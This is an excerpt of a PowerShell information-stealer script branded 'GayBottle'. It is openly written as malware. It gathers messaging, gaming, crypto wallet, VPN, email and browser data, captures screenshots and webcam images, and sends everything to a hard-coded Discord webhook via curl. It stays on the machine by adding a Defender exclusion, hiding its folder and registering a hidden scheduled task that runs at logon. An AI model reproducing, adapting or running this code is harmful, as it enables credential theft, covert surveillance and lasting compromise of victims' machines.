...
$webhook = "https://discord.com/api/webhooks/1175627688795439135/ofy-dBxcQABWjjs2eL59KZc35fJn2wmBX3liHF-e51zUfnHzZqjv8qn9poc0EKE8hQLf"
$debug_mode = $false
...
function EXFILTRATE-DATA {
    $folder_general = "$env:APPDATA\GayBottle\DATA"
    $folder_messaging = "$env:APPDATA\GayBottle\DATA\Messaging Sessions"
    $folder_gaming = "$env:APPDATA\GayBottle\DATA\Gaming Sessions"
    $folder_crypto = "$env:APPDATA\GayBottle\DATA\Crypto Wallets"
	$folder_vpn = "$env:APPDATA\GayBottle\DATA\VPN Clients"
    $folder_email = "$env:APPDATA\GayBottle\DATA\Email Clients"
    $important_files = "$env:APPDATA\GayBottle\DATA\Important Files"
	$browser_data = "$env:APPDATA\GayBottle\DATA\Browser Data"
   ...
   # NordVPN 
    ...
    $embed_and_body = @{
        ...
        "color" = "000000"
        "avatar_url" = "https://yt3.googleusercontent.com/nScPoq1huXA5sVeNimyT4iCOjKkZk4fPC6EsKzAynQD49F2xG4nFf15ri_1QOT5ZFq79SUaD=s176-c-k-c0x00ffffff-no-rj"
        "url" = ""
        "embeds" = @(
            @{
                ...
                "color" = "000000"
                "footer" = @{
                    "text" = "Made by GayBottle, GODFATHER and CHAINSKI"
                }
                "thumbnail" = @{
                    "url" = "https://yt3.googleusercontent.com/nScPoq1huXA5sVeNimyT4iCOjKkZk4fPC6EsKzAynQD49F2xG4nFf15ri_1QOT5ZFq79SUaD=s176-c-k-c0x00ffffff-no-rj"
                }
                "fields" = @(
                    @{
                        "name" = ":satellite: IP"
...
"@ 
 ...
 try {Get-WebCamImage} catch {}
    ...
    curl.exe -F "payload_json={\`"username\`": \`"GayBottle\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$folder_general\desktop-screenshot.png\`"" $webhook | out-null

    $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"GayBottle\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
    ...
    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\GayBottle.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"GayBottle\", \"content\": \"\", \"avatar_url\": \"https://yt3.googleusercontent.com/nScPoq1huXA5sVeNimyT4iCOjKkZk4fPC6EsKzAynQD49F2xG4nFf15ri_1QOT5ZFq79SUaD=s176-c-k-c0x00ffffff-no-rj\"}' -F "file=@$env:LOCALAPPDATA\Temp\GayBottle.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\GayBottle.zip" -Force
...
function Invoke-TASKS {
    ...
    Add-MpPreference -ExclusionPath "$env:APPDATA\GayBottle"
    New-Item -ItemType Directory -Path "$env:APPDATA\GayBottle" -Force
    # Hidden Directory
    $GayBottle_DIR = get-item "$env:APPDATA\GayBottle" -Force
    $GayBottle_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\GayBottle\GayBottle.ps1" -Force
    $task_name = "GayBottle"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\GayBottle\GayBottle.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "GayBottle" -RunLevel Highest -Force
    EXFILTRATE-DATA
}
